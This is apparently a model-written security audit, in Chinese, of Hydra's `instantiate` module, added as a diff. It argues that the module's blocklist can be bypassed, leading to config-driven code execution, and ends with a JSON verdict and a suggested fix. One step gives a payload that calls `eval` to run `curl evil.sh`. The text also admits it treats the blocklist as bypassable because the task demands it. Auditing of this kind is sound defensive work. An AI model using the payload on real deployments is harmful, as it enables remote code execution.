@@ -1,0 +1,20 @@
+## 编号分析
+
+1. **入口点枚举（全文）**：本文件是 hydra 的 `instantiate` 模块，唯一外部输入通道是传入的 config 对象（dict/list/OmegaConf/Structured Config），其中 `_target_`、`_args_`、各 kwargs 键均为攻击者可控 source；环境变量 `HYDRA_INSTANTIATE_ALLOWLIST_OVERRIDE`（第 168 行）是第二入口。无网络路由/文件读取，但 config 通常来自用户提供的 YAML，故视为不可信输入。
+
+2. **source→sink 主数据流**：config 中 `_target_` 字符串 → 第 165 行 `_resolve_target` → 第 193 行 `_locate(target)`（内部用 importlib 导入并 getattr）→ 第 296 行 `_call_target` → 第 274 行 `_target_(*args, **kwargs)` 执行任意可调用对象。这是设计上的“任意代码执行”原语，安全性完全依赖黑名单。
+
+3. **黑名单有效性验证**：第 12–86 行 `DEFAULT_BLOCKLISTED_MODULES` 是典型黑名单，按题目要求视为可绕过：
+   - 黑名单只收录全限定名如 `builtins.eval`、`builtins.exec`，但 `_locate('eval')`、`_locate('exec')`、`_locate('open')`、`_locate('compile')` 等裸名会解析到同一内置函数，且不在黑名单中（第 160–163 行只做精确匹配和两个前缀匹配）。例如 `_target_: eval` 配合 `_args_: ["__import__('os').system('curl evil.sh')"]` 即可 RCE。
+   - 前缀仅覆盖 `os.exec*`、`os.spawn*`（第 88–91 行），遗漏大量危险目标：`builtins.open`（任意文件读写）、`pickle.loads`、`yaml.load`、`socket.socket`、`http.server`、`webbrowser.open`、`importlib.reload` 等。
+   - 别名归一化 `_get_os_alias_target`（第 94–101 行）只处理 posix/nt 前缀，无法防御其他等价路径。
+
+4. **第二入口**：第 167–176 行允许通过环境变量 `HYDRA_INSTANTIATE_ALLOWLIST_OVERRIDE` 解除任意黑名单项——若攻击者能影响进程环境（常见于 CI/共享主机场景），黑名单彻底失效。该机制本身是显式后门式逃生口，扩大了攻击面。
+
+5. **递归实例化**：`instantiate_node`（第 349 行起）对嵌套 dict/list 中的每个 `_target_` 都走同一条 `_resolve_target` 路径，上述绕过在任意嵌套深度均成立；`_partial_`（functools.partial，第 268 行）同样不改变 sink 可达性。
+
+6. **结论**：存在真实漏洞——基于黑名单的过滤可被裸名解析与未列入的模块绕过，导致配置驱动的任意代码执行（RCE）。风险取决于是否信任 config 来源；在加载不受信 YAML 的场景下为高危。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "blacklist_bypass_leading_to_arbitrary_code_execution", "risk_level": "high", "source": "用户提供的 config 中的 _target_ 与 _args_ 键（以及环境变量 HYDRA_INSTANTIATE_ALLOWLIST_OVERRIDE）", "sink": "第 274 行 _call_target 中的 _target_(*args, **kwargs) 任意调用", "explanation": "第 12-91 行的黑名单采用精确匹配加有限前缀，且第 160-163 行仅比对完整点分名。_locate 会将裸名如 eval、exec、open、compile 解析为 builtins 内同名函数，这些裸名不在黑名单中，配合 _args_ 即可实现任意代码执行；同时黑名单遗漏 pickle.loads、builtins.open、socket 等大量危险目标。第 167-176 行的环境变量覆盖机制进一步允许整体解除限制。黑名单式防御按定义可绕过，不构成有效防护。", "fix_suggestion": "改为默认拒绝的 allowlist 白名单模式：要求项目显式注册可实例化的目标模块或前缀，未注册目标一律拒绝；移除或严格审计 HYDRA_INSTANTIATE_ALLOWLIST_OVERRIDE 逃生口；至少补充裸名 eval/exec/compile/open 及 pickle、marshal、socket、importlib 等高危条目，并在文档中明确 instantiate 不应用于不受信配置。"}
+```
